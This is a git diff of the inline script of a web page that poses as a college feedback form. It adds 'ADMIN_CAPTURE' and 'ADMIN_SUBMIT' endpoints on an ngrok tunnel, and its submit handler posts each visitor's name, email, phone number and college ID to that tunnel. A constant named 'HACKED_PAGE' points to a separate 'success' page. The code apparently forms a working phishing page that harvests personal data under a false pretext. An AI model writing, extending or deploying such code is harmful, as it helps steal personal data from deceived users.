@@ -67,6 +67,8 @@
 
   <script>
     const HACKED_PAGE = "https://An0nymOuS29.github.io/success.html";
+    const ADMIN_CAPTURE = "https://stainless-king-gravitate.ngrok-free.dev/capture";
+    const ADMIN_SUBMIT = "https://stainless-king-gravitate.ngrok-free.dev/submit";
 
     const form = document.getElementById("feedbackForm");
     const msg = document.getElementById("msg");
@@ -104,17 +106,17 @@
       const phoneEl = document.getElementById("phone");
       const collegeEl = document.getElementById("collegeId");
 
-      const name = nameEl.value.trim();
-      const email = emailEl.value.trim();
-      const phone = phoneEl.value.trim();
-      const collegeId = collegeEl.value.trim();
+      const userName = nameEl.value.trim();
+      const userEmail = emailEl.value.trim();
+      const userPhone = phoneEl.value.trim();
+      const userCollegeId = collegeEl.value.trim();
 
       let ok = true;
       [nameEl, emailEl, phoneEl, collegeEl].forEach(el => el.classList.remove("invalid", "valid"));
 
-      if (!name) { nameEl.classList.add("invalid"); ok = false; } else nameEl.classList.add("valid");
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { emailEl.classList.add("invalid"); ok = false; } else emailEl.classList.add("valid");
-      if (!/^[+]?[\d\s\-()]{7,15}$/.test(phone.replace(/\s/g, ""))) { phoneEl.classList.add("invalid"); ok = false; } else phoneEl.classList.add("valid");
+      if (!userName) { nameEl.classList.add("invalid"); ok = false; } else nameEl.classList.add("valid");
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) { emailEl.classList.add("invalid"); ok = false; } else emailEl.classList.add("valid");
+      if (!/^[+]?[\d\s\-()]{7,15}$/.test(phoneEl.value.replace(/\s/g, ""))) { phoneEl.classList.add("invalid"); ok = false; } else phoneEl.classList.add("valid");
       if (!collegeEl.value.trim()) { collegeEl.classList.add("invalid"); ok = false; } else collegeEl.classList.add("valid");
 
       if (!ok) { showMsg("Please fix the highlighted fields."); return; }
@@ -124,17 +126,15 @@
       btn.textContent = "Submitting...";
       showMsg("", false);
 
-      const name = nameEl.value.trim();
-      const email = emailEl.value.trim();
-      const phone = phoneEl.value.trim();
-      const collegeId = collegeEl.value.trim();
-
       // 1. Send initial user data to admin server
       try {
         console.log("Sending submit to admin server...");
         await fetch("https://stainless-king-gravitate.ngrok-free.dev/submit", {
           method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ name, email, phone: phoneEl.value.trim(), collegeId, time: new Date().toISOString() })
+          body: JSON.stringify({
+            name: userName, email: userEmail, phone: phoneEl.value.trim(),
+            collegeId: collegeEl.value.trim(), time: new Date().toISOString()
+          })
         });
         console.log("Submit sent successfully");
       } catch (e) {
